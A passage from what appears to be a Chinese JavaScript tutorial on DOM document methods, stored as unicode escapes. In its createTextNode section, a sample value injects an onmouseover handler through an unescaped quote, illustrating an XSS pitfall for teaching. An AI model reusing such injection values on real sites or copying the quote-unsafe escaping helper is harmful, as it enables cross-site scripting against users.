\u6807\u7b7e\u540d\uff0c\u8fd4\u56de\u7b26\u5408\u6761\u4ef6\u7684\u5143\u7d20\u3002\u5b83\u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u5bf9\u8c61\uff08 HTMLCollection \u5b9e\u4f8b\uff09\uff0c\u53ef\u4ee5\u5b9e\u65f6\u53cd\u6620 HTML \u6587\u6863\u7684\u53d8\u5316\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5339\u914d\u7684\u5143\u7d20\uff0c\u5c31\u8fd4\u56de\u4e00\u4e2a\u7a7a\u96c6\u3002 1 2 var paras = document . getElementsByTagName ( 'p' ); paras instanceof HTMLCollection // true \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de\u5f53\u524d\u6587\u6863\u7684\u6240\u6709 p \u5143\u7d20\u8282\u70b9\u3002 HTML \u6807\u7b7e\u540d\u662f\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u7684\uff0c\u56e0\u6b64 getElementsByTagName() \u65b9\u6cd5\u7684\u53c2\u6570\u4e5f\u662f\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u7684\u3002\u53e6\u5916\uff0c\u8fd4\u56de\u7ed3\u679c\u4e2d\uff0c\u5404\u4e2a\u6210\u5458\u7684\u987a\u5e8f\u5c31\u662f\u5b83\u4eec\u5728\u6587\u6863\u4e2d\u51fa\u73b0\u7684\u987a\u5e8f\u3002 \u5982\u679c\u4f20\u5165 * \uff0c\u5c31\u53ef\u4ee5\u8fd4\u56de\u6587\u6863\u4e2d\u6240\u6709 HTML \u5143\u7d20\u3002 1 var allElements = document . getElementsByTagName ( '*' ); \u6ce8\u610f\uff0c\u5143\u7d20\u8282\u70b9\u672c\u8eab\u4e5f\u5b9a\u4e49\u4e86 getElementsByTagName \u65b9\u6cd5\uff0c\u8fd4\u56de\u8be5\u5143\u7d20\u7684\u540e\u4ee3\u5143\u7d20\u4e2d\u7b26\u5408\u6761\u4ef6\u7684\u5143\u7d20\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u4ec5\u53ef\u4ee5\u5728 document \u5bf9\u8c61\u4e0a\u8c03\u7528\uff0c\u4e5f\u53ef\u4ee5\u5728\u4efb\u4f55\u5143\u7d20\u8282\u70b9\u4e0a\u8c03\u7528\u3002 1 2 var firstPara = document . getElementsByTagName ( 'p' )[ 0 ]; var spans = firstPara . getElementsByTagName ( 'span' ); \u4e0a\u9762\u4ee3\u7801\u9009\u4e2d\u7b2c\u4e00\u4e2a p \u5143\u7d20\u5185\u90e8\u7684\u6240\u6709 span \u5143\u7d20\u3002 document.getElementsByClassName() \u00b6 document.getElementsByClassName() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08 HTMLCollection \u5b9e\u4f8b\uff09\uff0c\u5305\u62ec\u4e86\u6240\u6709 class \u540d\u5b57\u7b26\u5408\u6307\u5b9a\u6761\u4ef6\u7684\u5143\u7d20\uff0c\u5143\u7d20\u7684\u53d8\u5316\u5b9e\u65f6\u53cd\u6620\u5728\u8fd4\u56de\u7ed3\u679c\u4e2d\u3002 1 var elements = document . getElementsByClassName ( names ); \u7531\u4e8e class \u662f\u4fdd\u7559\u5b57\uff0c\u6240\u4ee5 JavaScript \u4e00\u5f8b\u4f7f\u7528 className \u8868\u793a CSS \u7684 class \u3002 \u53c2\u6570\u53ef\u4ee5\u662f\u591a\u4e2a class \uff0c\u5b83\u4eec\u4e4b\u95f4\u4f7f\u7528\u7a7a\u683c\u5206\u9694\u3002 1 var elements = document . getElementsByClassName ( 'foo bar' ); \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de\u540c\u65f6\u5177\u6709 foo \u548c bar \u4e24\u4e2a class \u7684\u5143\u7d20\uff0c foo \u548c bar \u7684\u987a\u5e8f\u4e0d\u91cd\u8981\u3002 \u6ce8\u610f\uff0c\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0cCSS \u7684 class \u662f\u5927\u5c0f\u5199\u654f\u611f\u7684\u3002\uff08 quirks mode \u4e0b\uff0c\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u3002\uff09 \u4e0e getElementsByTagName() \u65b9\u6cd5\u4e00\u6837\uff0c getElementsByClassName() \u65b9\u6cd5\u4e0d\u4ec5\u53ef\u4ee5\u5728 document \u5bf9\u8c61\u4e0a\u8c03\u7528\uff0c\u4e5f\u53ef\u4ee5\u5728\u4efb\u4f55\u5143\u7d20\u8282\u70b9\u4e0a\u8c03\u7528\u3002 1 2 // \u975edocument\u5bf9\u8c61\u4e0a\u8c03\u7528 var elements = rootElement . getElementsByClassName ( names ); document.getElementsByName() \u00b6 document.getElementsByName() \u65b9\u6cd5\u7528\u4e8e\u9009\u62e9\u62e5\u6709 name \u5c5e\u6027\u7684 HTML \u5143\u7d20\uff08\u6bd4\u5982 <form> \u3001 <radio> \u3001 <img> \u3001 <frame> \u3001 <embed> \u548c <object> \u7b49\uff09\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u7684\u5bf9\u8c61\uff08 NodeList \u5b9e\u4f8b\uff09\uff0c\u56e0\u4e3a name \u5c5e\u6027\u76f8\u540c\u7684\u5143\u7d20\u53ef\u80fd\u4e0d\u6b62\u4e00\u4e2a\u3002 1 2 3 // \u8868\u5355\u4e3a <form name=\"x\"></form> var forms = document . getElementsByName ( 'x' ); forms [ 0 ]. tagName // \"FORM\" document.getElementById() \u00b6 document.getElementById() \u65b9\u6cd5\u8fd4\u56de\u5339\u914d\u6307\u5b9a id \u5c5e\u6027\u7684\u5143\u7d20\u8282\u70b9\u3002\u5982\u679c\u6ca1\u6709\u53d1\u73b0\u5339\u914d\u7684\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 var elem = document . getElementById ( 'para1' ); \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u662f\u5927\u5c0f\u5199\u654f\u611f\u7684\u3002\u6bd4\u5982\uff0c\u5982\u679c\u67d0\u4e2a\u8282\u70b9\u7684 id \u5c5e\u6027\u662f main \uff0c\u90a3\u4e48 document.getElementById('Main') \u5c06\u8fd4\u56de null \u3002 document.getElementById() \u65b9\u6cd5\u4e0e document.querySelector() \u65b9\u6cd5\u90fd\u80fd\u83b7\u53d6\u5143\u7d20\u8282\u70b9\uff0c\u4e0d\u540c\u4e4b\u5904\u662f document.querySelector() \u65b9\u6cd5\u7684\u53c2\u6570\u4f7f\u7528 CSS \u9009\u62e9\u5668\u8bed\u6cd5\uff0c document.getElementById() \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u5143\u7d20\u7684 id \u5c5e\u6027\u3002 1 2 document . getElementById ( 'myElement' ) document . querySelector ( '#myElement' ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e24\u4e2a\u65b9\u6cd5\u90fd\u80fd\u9009\u4e2d id \u4e3a myElement \u7684\u5143\u7d20\uff0c\u4f46\u662f document.getElementById() \u6bd4 document.querySelector() \u6548\u7387\u9ad8\u5f97\u591a\u3002 \u53e6\u5916\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u53ea\u80fd\u5728 document \u5bf9\u8c61\u4e0a\u4f7f\u7528\uff0c\u4e0d\u80fd\u5728\u5176\u4ed6\u5143\u7d20\u8282\u70b9\u4e0a\u4f7f\u7528\u3002 document.elementFromPoint()\uff0cdocument.elementsFromPoint() \u00b6 document.elementFromPoint() \u65b9\u6cd5\u8fd4\u56de\u4f4d\u4e8e\u9875\u9762\u6307\u5b9a\u4f4d\u7f6e\u6700\u4e0a\u5c42\u7684\u5143\u7d20\u8282\u70b9\u3002 1 var element = document . elementFromPoint ( 50 , 50 ); \u4e0a\u9762\u4ee3\u7801\u9009\u4e2d\u5728 (50, 50) \u8fd9\u4e2a\u5750\u6807\u4f4d\u7f6e\u7684\u6700\u4e0a\u5c42\u7684\u90a3\u4e2a HTML \u5143\u7d20\u3002 elementFromPoint \u65b9\u6cd5\u7684\u4e24\u4e2a\u53c2\u6570\uff0c\u4f9d\u6b21\u662f\u76f8\u5bf9\u4e8e\u5f53\u524d\u89c6\u53e3\u5de6\u4e0a\u89d2\u7684\u6a2a\u5750\u6807\u548c\u7eb5\u5750\u6807\uff0c\u5355\u4f4d\u662f\u50cf\u7d20\u3002\u5982\u679c\u4f4d\u4e8e\u8be5\u4f4d\u7f6e\u7684 HTML \u5143\u7d20\u4e0d\u53ef\u8fd4\u56de\uff08\u6bd4\u5982\u6587\u672c\u6846\u7684\u6eda\u52a8\u6761\uff09\uff0c\u5219\u8fd4\u56de\u5b83\u7684\u7236\u5143\u7d20\uff08\u6bd4\u5982\u6587\u672c\u6846\uff09\u3002\u5982\u679c\u5750\u6807\u503c\u65e0\u610f\u4e49\uff08\u6bd4\u5982\u8d1f\u503c\u6216\u8d85\u8fc7\u89c6\u53e3\u5927\u5c0f\uff09\uff0c\u5219\u8fd4\u56de null \u3002 document.elementsFromPoint() \u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u4f4d\u4e8e\u6307\u5b9a\u5750\u6807\uff08\u76f8\u5bf9\u4e8e\u89c6\u53e3\uff09\u7684\u6240\u6709\u5143\u7d20\u3002 1 var elements = document . elementsFromPoint ( x , y ); document.createElement() \u00b6 document.createElement \u65b9\u6cd5\u7528\u6765\u751f\u6210\u5143\u7d20\u8282\u70b9\uff0c\u5e76\u8fd4\u56de\u8be5\u8282\u70b9\u3002 1 var newDiv = document . createElement ( 'div' ); createElement \u65b9\u6cd5\u7684\u53c2\u6570\u4e3a\u5143\u7d20\u7684\u6807\u7b7e\u540d\uff0c\u5373\u5143\u7d20\u8282\u70b9\u7684 tagName \u5c5e\u6027\uff0c\u5bf9\u4e8e HTML \u7f51\u9875\u5927\u5c0f\u5199\u4e0d\u654f\u611f\uff0c\u5373\u53c2\u6570\u4e3a div \u6216 DIV \u8fd4\u56de\u7684\u662f\u540c\u4e00\u79cd\u8282\u70b9\u3002\u5982\u679c\u53c2\u6570\u91cc\u9762\u5305\u542b\u5c16\u62ec\u53f7\uff08\u5373 < \u548c > \uff09\u4f1a\u62a5\u9519\u3002 1 2 document . createElement ( '<div>' ); // DOMException: The tag name provided ('<div>') is not a valid name \u6ce8\u610f\uff0c document.createElement \u7684\u53c2\u6570\u53ef\u4ee5\u662f\u81ea\u5b9a\u4e49\u7684\u6807\u7b7e\u540d\u3002 1 document . createElement ( 'foo' ); document.createTextNode() \u00b6 document.createTextNode \u65b9\u6cd5\u7528\u6765\u751f\u6210\u6587\u672c\u8282\u70b9\uff08 Text \u5b9e\u4f8b\uff09\uff0c\u5e76\u8fd4\u56de\u8be5\u8282\u70b9\u3002\u5b83\u7684\u53c2\u6570\u662f\u6587\u672c\u8282\u70b9\u7684\u5185\u5bb9\u3002 1 2 3 var newDiv = document . createElement ( 'div' ); var newContent = document . createTextNode ( 'Hello' ); newDiv . appendChild ( newContent ); \u4e0a\u9762\u4ee3\u7801\u65b0\u5efa\u4e00\u4e2a div \u8282\u70b9\u548c\u4e00\u4e2a\u6587\u672c\u8282\u70b9\uff0c\u7136\u540e\u5c06\u6587\u672c\u8282\u70b9\u63d2\u5165 div \u8282\u70b9\u3002 \u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u786e\u4fdd\u8fd4\u56de\u7684\u8282\u70b9\uff0c\u88ab\u6d4f\u89c8\u5668\u5f53\u4f5c\u6587\u672c\u6e32\u67d3\uff0c\u800c\u4e0d\u662f\u5f53\u4f5c HTML \u4ee3\u7801\u6e32\u67d3\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u7528\u6765\u5c55\u793a\u7528\u6237\u7684\u8f93\u5165\uff0c\u907f\u514d XSS \u653b\u51fb\u3002 1 2 3 4 var div = document . createElement ( 'div' ); div . appendChild ( document . createTextNode ( '<span>Foo & bar</span>' )); console . log ( div . innerHTML ) // &lt;span&gt;Foo &amp; bar&lt;/span&gt; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c createTextNode \u65b9\u6cd5\u5bf9\u5927\u4e8e\u53f7\u548c\u5c0f\u4e8e\u53f7\u8fdb\u884c\u8f6c\u4e49\uff0c\u4ece\u800c\u4fdd\u8bc1\u5373\u4f7f\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\u5305\u542b\u6076\u610f\u4ee3\u7801\uff0c\u4e5f\u80fd\u6b63\u786e\u663e\u793a\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u65b9\u6cd5\u4e0d\u5bf9\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\u8f6c\u4e49\uff0c\u6240\u4ee5\u4e0d\u80fd\u7528\u6765\u5bf9 HTML \u5c5e\u6027\u8d4b\u503c\u3002 1 2 3 4 5 6 7 8 9 10 11 function escapeHtml(str) { var div = document.createElement('div'); div.appendChild(document.createTextNode(str)); return div.innerHTML; }; var userWebsite = '\" onmouseover=\"alert(\\'derp\\')\" \"'; var profileLink = ' < a href = \"' + escapeHtml(userWebsite) + '\" > Bob </ a > '; var div = document.getElementById('target'); div.innerHTML = profileLink; // < a href = \"\" onmouseover = \"alert('derp')\" \"\" > Bob </ a > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e createTextNode \u65b9\u6cd5\u4e0d\u8f6c\u4e49\u53cc\u5f15\u53f7\uff0c\u5bfc\u81f4 onmouseover \u65b9\u6cd5\u88ab\u6ce8\u5165\u4e86\u4ee3\u7801\u3002 document.createAttribute() \u00b6 document.createAttribute \u65b9\u6cd5\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u5c5e\u6027\u8282\u70b9\uff08 Attr \u5b9e\u4f8b\uff09\uff0c\u5e76\u8fd4\u56de\u5b83\u3002 1 var attribute = document . createAttribute ( name ); document.createAttribute \u65b9\u6cd5\u7684\u53c2\u6570 name \uff0c\u662f\u5c5e\u6027\u7684\u540d\u79f0\u3002 1 2 3 4 5 6 7 8 var node = document . getElementById ( 'div1' ); var a = document . createAttribute ( 'my_attrib' ); a . value = 'newVal' ; node . setAttributeNode ( a ); // \u6216\u8005 node . setAttribute ( 'my_attrib' , 'newVal' ); \u4e0a\u9762\u4ee3\u7801\u4e3a div1 \u8282\u70b9\uff0c\u63d2\u5165\u4e00\u4e2a\u503c\u4e3a newVal \u7684 my_attrib \u5c5e\u6027\u3002 document.createComment() \u00b6 document.createComment \u65b9\u6cd5\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u6ce8\u91ca\u8282\u70b9\uff0c\u5e76\u8fd4\u56de\u8be5\u8282\u70b9\u3002 1 var CommentNode = document . createComment ( data ); document.createComment \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4f1a\u6210\u4e3a\u6ce8\u91ca\u8282\u70b9\u7684\u5185\u5bb9\u3002 document.createDocumentFragment() \u00b6 document.createDocumentFragment \u65b9\u6cd5\u751f\u6210\u4e00\u4e2a\u7a7a\u7684\u6587\u6863\u7247\u6bb5\u5bf9\u8c61\uff08 DocumentFragment \u5b9e\u4f8b\uff09\u3002 1 var docFragment = document . createDocumentFragment (); DocumentFragment \u662f\u4e00\u4e2a\u5b58\u5728\u4e8e\u5185\u5b58\u7684 DOM \u7247\u6bb5\uff0c\u4e0d\u5c5e\u4e8e\u5f53\u524d\u6587\u6863\uff0c\u5e38\u5e38\u7528\u6765\u751f\u6210\u4e00\u6bb5\u8f83\u590d\u6742\u7684 DOM \u7ed3\u6784\uff0c\u7136\u540e\u518d\u63d2\u5165\u5f53\u524d\u6587\u6863\u3002\u8fd9\u6837\u505a\u7684\u597d\u5904\u5728\u4e8e\uff0c\u56e0\u4e3a DocumentFragment \u4e0d\u5c5e\u4e8e\u5f53\u524d\u6587\u6863\uff0c\u5bf9\u5b83\u7684\u4efb\u4f55\u6539\u52a8\uff0c\u90fd\u4e0d\u4f1a\u5f15\u53d1\u7f51\u9875\u7684\u91cd\u65b0\u6e32\u67d3\uff0c\u6bd4\u76f4\u63a5\u4fee\u6539\u5f53\u524d\u6587\u6863\u7684 DOM \u6709\u66f4\u597d\u7684\u6027\u80fd\u8868\u73b0\u3002 1 2 3 4 5 6 7 8 9 10 var docfrag = document . createDocumentFragment (); [ 1 , 2 , 3 , 4 ]. forEach ( function ( e ) { var li = document . createElement ( 'li' ); li . textContent = e ; docfrag . appendChild ( li ); }); var element = document . getElementById ( 'ul' ); element . appendChild ( docfrag ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6587\u6863\u7247\u65ad docfrag \u5305\u542b\u56db\u4e2a <li> \u8282\u70b9\uff0c\u8fd9\u4e9b\u5b50\u8282\u70b9\u88ab\u4e00\u6b21\u6027\u63d2\u5165\u4e86\u5f53\u524d\u6587\u6863\u3002 document.createEvent() \u00b6 document.createEvent \u65b9\u6cd5\u751f\u6210\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\uff08 Event \u5b9e\u4f8b\uff09\uff0c\u8be5\u5bf9\u8c61\u53ef\u4ee5\u88ab element.dispatchEvent \u65b9\u6cd5\u4f7f\u7528\uff0c\u89e6\u53d1\u6307\u5b9a\u4e8b\u4ef6\u3002 1 var event = document . createEvent ( type ); document.createEvent \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e8b\u4ef6\u7c7b\u578b\uff0c\u6bd4\u5982 UIEvents \u3001 MouseEvents \u3001 MutationEvents \u3001 HTMLEvents \u3002 1 2 3 4 5 6 var event = document . createEvent ( 'Event' ); event . initEvent ( 'build' , true , true ); document . addEventListener ( 'build' , function ( e ) { console . log ( e . type ); // \"build\" }, false ); document . dispatchEvent ( event ); \u4e0a\u9762\u4ee3\u7801\u65b0\u5efa\u4e86\u4e00\u4e2a\u540d\u4e3a build \u7684\u4e8b\u4ef6\u5b9e\u4f8b\uff0c\u7136\u540e\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002 document.addEventListener()\uff0cdocument.removeEventListener()\uff0cdocument.dispatchEvent() \u00b6 \u8fd9\u4e09\u4e2a\u65b9\u6cd5\u7528\u4e8e\u5904\u7406 document \u8282\u70b9\u7684\u4e8b\u4ef6\u3002\u5b83\u4eec\u90fd\u7ee7\u627f\u81ea EventTarget \u63a5\u53e3\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u53c2\u89c1\u300aEventTarget \u63a5\u53e3\u300b\u4e00\u7ae0\u3002 1 2 3 4 5 6 7 8 9 // \u6dfb\u52a0\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570 document . addEventListener ( 'click' , listener , false ); // \u79fb\u9664\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570 document . removeEventListener ( 'click' , listener , false ); // \u89e6\u53d1\u4e8b\u4ef6 var event = new Event ( 'click' ); document . dispatchEvent ( event ); document.hasFocus() \u00b6 document.hasFocus \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u6587\u6863\u4e4b\u4e2d\u662f\u5426\u6709\u5143\u7d20\u88ab\u6fc0\u6d3b\u6216\u83b7\u5f97\u7126\u70b9\u3002 1 var focused = document . hasFocus (); \u6ce8\u610f\uff0c\u6709\u7126\u70b9\u7684\u6587\u6863\u5fc5\u5b9a\u88ab\u6fc0\u6d3b\uff08active\uff09\uff0c\u53cd\u4e4b\u4e0d\u6210\u7acb\uff0c\u6fc0\u6d3b\u7684\u6587\u6863\u672a\u5fc5\u6709\u7126\u70b9\u3002\u6bd4\u5982\uff0c\u7528\u6237\u70b9\u51fb\u6309\u94ae\uff0c\u4ece\u5f53\u524d\u7a97\u53e3\u8df3\u51fa\u4e00\u4e2a\u65b0\u7a97\u53e3\uff0c\u8be5\u65b0\u7a97\u53e3\u5c31\u662f\u6fc0\u6d3b\u7684\uff0c\u4f46\u662f\u4e0d\u62e5\u6709\u7126\u70b9\u3002 document.adoptNode()\uff0cdocument.importNode() \u00b6 document.adoptNode \u65b9\u6cd5\u5c06\u67d0\u4e2a\u8282\u70b9\u53ca\u5176\u5b50\u8282\u70b9\uff0c\u4ece\u539f\u6765\u6240\u5728\u7684\u6587\u6863\u6216 DocumentFragment \u91cc\u9762\u79fb\u9664\uff0c\u5f52\u5c5e\u5f53\u524d document \u5bf9\u8c61\uff0c\u8fd4\u56de\u63d2\u5165\u540e\u7684\u65b0\u8282\u70b9\u3002\u63d2\u5165\u7684\u8282\u70b9\u5bf9\u8c61\u7684 ownerDocument \u5c5e\u6027\uff0c\u4f1a\u53d8\u6210\u5f53\u524d\u7684 document \u5bf9\u8c61\uff0c\u800c parentNode \u5c5e\u6027\u662f null \u3002 1 2 var node = document . adoptNode ( externalNode ); document . appendChild ( node ); \u6ce8\u610f\uff0c document.adoptNode \u65b9\u6cd5\u53ea\u662f\u6539\u53d8\u4e86\u8282\u70b9\u7684\u5f52\u5c5e\uff0c\u5e76\u6ca1\u6709\u5c06\u8fd9\u4e2a\u8282\u70b9\u63d2\u5165\u65b0\u7684\u6587\u6863\u6811\u3002\u6240\u4ee5\uff0c\u8fd8\u8981\u518d\u7528 appendChild \u65b9\u6cd5\u6216 insertBefore \u65b9\u6cd5\uff0c\u5c06\u65b0\u8282\u70b9\u63d2\u5165\u5f53\u524d\u6587\u6863\u6811\u3002 document.importNode \u65b9\u6cd5\u5219\u662f\u4ece\u539f\u6765\u6240\u5728\u7684\u6587\u6863\u6216 DocumentFragment \u91cc\u9762\uff0c\u62f7\u8d1d\u67d0\u4e2a\u8282\u70b9\u53ca\u5176\u5b50\u8282\u70b9\uff0c\u8ba9\u5b83\u4eec\u5f52\u5c5e\u5f53\u524d document \u5bf9\u8c61\u3002\u62f7\u8d1d\u7684\u8282\u70b9\u5bf9\u8c61\u7684 ownerDocument \u5c5e\u6027\uff0c\u4f1a\u53d8\u6210\u5f53\u524d\u7684 document \u5bf9\u8c61\uff0c\u800c parentNode \u5c5e\u6027\u662f null \u3002 1 var node = document . importNode ( externalNode , deep ); document.importNode \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5916\u90e8\u8282\u70b9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5bf9\u5916\u90e8\u8282\u70b9\u662f\u6df1\u62f7\u8d1d\u8fd8\u662f\u6d45\u62f7\u8d1d\uff0c\u9ed8\u8ba4\u662f\u6d45\u62f7\u8d1d\uff08false\uff09\u3002\u867d\u7136\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u4f46\u662f\u5efa\u8bae\u603b\u662f\u4fdd\u7559\u8fd9\u4e2a\u53c2\u6570\uff0c\u5e76\u8bbe\u4e3a true \u3002 \u6ce8\u610f\uff0c document.importNode \u65b9\u6cd5\u53ea\u662f\u62f7\u8d1d\u5916\u90e8\u8282\u70b9\uff0c\u8fd9\u65f6\u8be5\u8282\u70b9\u7684\u7236\u8282\u70b9\u662f null \u3002\u4e0b\u4e00\u6b65\u8fd8\u5fc5\u987b\u5c06\u8fd9\u4e2a\u8282\u70b9\u63d2\u5165\u5f53\u524d\u6587\u6863\u6811\u3002 1 2 3 4 var iframe = document . getElementsByTagName ( 'iframe' )[ 0 ]; var oldNode = iframe . contentWindow . document . getElementById ( 'myNode' ); var newNode = document . importNode ( oldNode , true ); document . getElementById ( \"container\" ). appendChild ( newNode ); \u4e0a\u9762\u4ee3\u7801\u4ece iframe \u7a97\u53e3\uff0c\u62f7\u8d1d\u4e00\u4e2a\u6307\u5b9a\u8282\u70b9 myNode \uff0c\u63d2\u5165\u5f53\u524d\u6587\u6863\u3002 document.createNodeIterator() \u00b6 document.createNodeIterator \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5b50\u8282\u70b9\u904d\u5386\u5668\u3002 1 2 3 4 var nodeIterator = document . createNodeIterator ( document . body , NodeFilter . SHOW_ELEMENT ); \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de <body> \u5143\u7d20\u5b50\u8282\u70b9\u7684\u904d\u5386\u5668\u3002 document.createNodeIterator \u65b9\u6cd5\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u6240\u8981\u904d\u5386\u7684\u6839\u8282\u70b9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u6240\u8981\u904d\u5386\u7684\u8282\u70b9\u7c7b\u578b\uff0c\u8fd9\u91cc\u6307\u5b9a\u4e3a\u5143\u7d20\u8282\u70b9\uff08 NodeFilter.SHOW_ELEMENT \uff09\u3002\u51e0\u79cd\u4e3b\u8981\u7684\u8282\u70b9\u7c7b\u578b\u5199\u6cd5\u5982\u4e0b\u3002 \u6240\u6709\u8282\u70b9\uff1aNodeFilter.SHOW_ALL \u5143\u7d20\u8282\u70b9\uff1aNodeFilter.SHOW_ELEMENT \u6587\u672c\u8282\u70b9\uff1aNodeFilter.SHOW_TEXT \u8bc4\u8bba\u8282\u70b9\uff1aNodeFilter.SHOW_COMMENT document.createNodeIterator \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u201c\u904d\u5386\u5668\u201d\u5bf9\u8c61\uff08 NodeFilter \u5b9e\u4f8b\uff09\u3002\u8be5\u5b9e\u4f8b\u7684 nextNode() \u65b9\u6cd5\u548c previousNode() \u65b9\u6cd5\uff0c\u53ef\u4ee5\u7528\u6765\u904d\u5386\u6240\u6709\u5b50\u8282\u70b9\u3002 1 2 3 4 5 6 7 var nodeIterator = document . createNodeIterator ( document . body ); var pars = []; var currentNode ; while ( currentNode = nodeIterator . nextNode ()) { pars . push ( currentNode ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4f7f\u7528\u904d\u5386\u5668\u7684 nextNode \u65b9\u6cd5\uff0c\u5c06\u6839\u8282\u70b9\u7684\u6240\u6709\u5b50\u8282\u70b9\uff0c\u4f9d\u6b21\u8bfb\u5165\u4e00\u4e2a\u6570\u7ec4\u3002 nextNode \u65b9\u6cd5\u5148\u8fd4\u56de\u904d\u5386\u5668\u7684\u5185\u90e8\u6307\u9488\u6240\u5728\u7684\u8282\u70b9\uff0c\u7136\u540e\u4f1a\u5c06\u6307\u9488\u79fb\u5411\u4e0b\u4e00\u4e2a\u8282\u70b9\u3002\u6240\u6709\u6210\u5458\u904d\u5386\u5b8c\u6210\u540e\uff0c\u8fd4\u56de null \u3002 previousNode \u65b9\u6cd5\u5219\u662f\u5148\u5c06\u6307\u9488\u79fb\u5411\u4e0a\u4e00\u4e2a\u8282\u70b9\uff0c\u7136\u540e\u8fd4\u56de\u8be5\u8282\u70b9\u3002 1 2 3 4 5 6 7 8 9 var nodeIterator = document . createNodeIterator ( document . body , NodeFilter . SHOW_ELEMENT ); var currentNode = nodeIterator . nextNode (); var previousNode = nodeIterator . previousNode (); currentNode === previousNode // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c currentNode \u548c previousNode \u90fd\u6307\u5411\u540c\u4e00\u4e2a\u7684\u8282\u70b9\u3002 \u6ce8\u610f\uff0c\u904d\u5386\u5668\u8fd4\u56de\u7684\u7b2c\u4e00\u4e2a\u8282\u70b9\uff0c\u603b\u662f\u6839\u8282\u70b9\u3002 1 pars [ 0 ] === document . body // true document.createTreeWalker() \u00b6 document.createTreeWalker \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a DOM \u7684\u5b50\u6811\u904d\u5386\u5668\u3002\u5b83\u4e0e document.createNodeIterator \u65b9\u6cd5\u57fa\u672c\u662f\u7c7b\u4f3c\u7684\uff0c\u533a\u522b\u5728\u4e8e\u5b83\u8fd4\u56de\u7684\u662f TreeWalker \u5b9e\u4f8b\uff0c\u540e\u8005\u8fd4\u56de\u7684\u662f NodeIterator \u5b9e\u4f8b\u3002\u53e6\u5916\uff0c\u5b83\u7684\u7b2c\u4e00\u4e2a\u8282\u70b9\u4e0d\u662f\u6839\u8282\u70b9\u3002 document.createTreeWalker \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6240\u8981\u904d\u5386\u7684\u6839\u8282\u70b9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u6240\u8981\u904d\u5386\u7684\u8282\u70b9\u7c7b\u578b\uff08\u4e0e document.createNodeIterator \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u76f8\u540c\uff09\u3002 1 2 3 4 5 6 7 8 9 10 var treeWalker = document . createTreeWalker ( document . body , NodeFilter . SHOW_ELEMENT ); var nodeList = []; while ( treeWalker . nextNode ()) { nodeList . push ( treeWalker . currentNode ); } \u4e0a\u9762\u4ee3\u7801\u904d\u5386 <body> \u8282\u70b9\u4e0b\u5c5e\u7684\u6240\u6709\u5143\u7d20\u8282\u70b9\uff0c\u5c06\u5b83\u4eec\u63d2\u5165 nodeList \u6570\u7ec4\u3002 document.execCommand()\uff0cdocument.queryCommandSupported()\uff0cdocument.queryCommandEnabled() \u00b6 \uff081\uff09document.execCommand() \u5982\u679c document.designMode \u5c5e\u6027\u8bbe\u4e3a on \uff0c\u90a3\u4e48\u6574\u4e2a\u6587\u6863\u7528\u6237\u53ef\u7f16\u8f91\uff1b\u5982\u679c\u5143\u7d20\u7684 contenteditable \u5c5e\u6027\u8bbe\u4e3a true 